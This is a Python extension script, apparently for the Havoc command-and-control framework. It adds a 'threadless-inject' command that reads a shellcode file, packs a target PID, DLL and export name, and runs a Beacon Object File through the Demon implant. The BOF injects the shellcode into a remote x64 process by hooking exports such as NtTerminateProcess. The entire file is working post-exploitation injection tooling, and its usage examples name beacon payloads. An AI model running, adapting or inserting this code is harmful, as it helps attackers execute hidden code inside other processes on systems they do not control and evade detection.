# threadless-inject.py - Havoc extension for ThreadlessInject BOF
#
# ThreadlessInject is a novel process injection technique that hooks an export
# function from a remote process to gain shellcode execution without creating
# a new thread.
#
# Usage:
#   threadless-inject <pid> <dll> <export> <shellcode_path>
#
# Examples:
#   threadless-inject 1234 ntdll.dll NtTerminateProcess /tmp/shellcode.bin
#   threadless-inject 1234 ntdll.dll NtOpenFile /tmp/beacon.bin
#
# Note: This BOF is x64-only due to x64-specific PEB access and shellcode loader

import os
from struct import pack, calcsize
from havoc import Demon, RegisterCommand

# BOF path (x64 only)
BOF_PATH = "./dist/threadless-inject.x64.o"


class Packer:
    """Helper class to pack arguments for BOF consumption."""

    def __init__(self):
        self.buffer = b''
        self.size = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addbytes(self, b):
        if b is None:
            b = b''
        fmt = "<L{}s".format(len(b))
        self.buffer += pack(fmt, len(b), b)
        self.size += calcsize(fmt)


def threadless_inject_command(demon_id, *args):
    """ThreadlessInject - hook export function for shellcode execution."""
    demon = Demon(demon_id)

    # Check architecture - x64 only
    arch = demon.ProcessArch
    if arch and "64" not in str(arch):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "ThreadlessInject is x64-only. Target process must be x64.")
        return False

    if len(args) < 4:
        demon.ConsoleWrite(demon.CONSOLE_INFO, "Usage: threadless-inject <pid> <dll> <export> <shellcode_path>")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "Arguments:")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "  pid            - Target process ID")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "  dll            - Target DLL name (e.g., ntdll.dll)")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "  export         - Export function to hook (e.g., NtTerminateProcess)")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "  shellcode_path - Path to shellcode file on teamserver")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "Examples:")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "  threadless-inject 1234 ntdll.dll NtTerminateProcess /tmp/sc.bin")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "  threadless-inject 1234 ntdll.dll NtOpenFile /tmp/beacon.bin")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "Common trigger exports:")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "  NtTerminateProcess - Executes when process closes")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "  NtOpenFile         - Executes on file operations")
        demon.ConsoleWrite(demon.CONSOLE_INFO, "  NtClose            - Executes on handle close")
        return False

    try:
        pid = int(args[0])
    except ValueError:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Invalid PID: {args[0]}")
        return False

    dll_name = args[1]
    export_name = args[2]
    shellcode_path = args[3]

    # Read shellcode from file
    try:
        with open(shellcode_path, "rb") as f:
            shellcode = f.read()
    except FileNotFoundError:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Shellcode file not found: {shellcode_path}")
        return False
    except Exception as e:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Error reading shellcode: {str(e)}")
        return False

    if len(shellcode) == 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Shellcode file is empty")
        return False

    # Pack arguments: pid (int), dll (str), export (str), shellcode (bytes)
    packer = Packer()
    packer.addint(pid)
    packer.addstr(dll_name)
    packer.addstr(export_name)
    packer.addbytes(shellcode)

    # Create task
    task_id = demon.ConsoleWrite(
        demon.CONSOLE_TASK,
        f"Injecting into PID {pid} via {dll_name}!{export_name} ({len(shellcode)} bytes)"
    )

    # Execute BOF
    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id


# Register the command
RegisterCommand(
    threadless_inject_command,
    "",
    "threadless-inject",
    "Threadless injection - hook export function for shellcode execution (x64 only)",
    0,
    "<pid> <dll> <export> <shellcode_path>",
    "1234 ntdll.dll NtTerminateProcess /tmp/shellcode.bin"
)
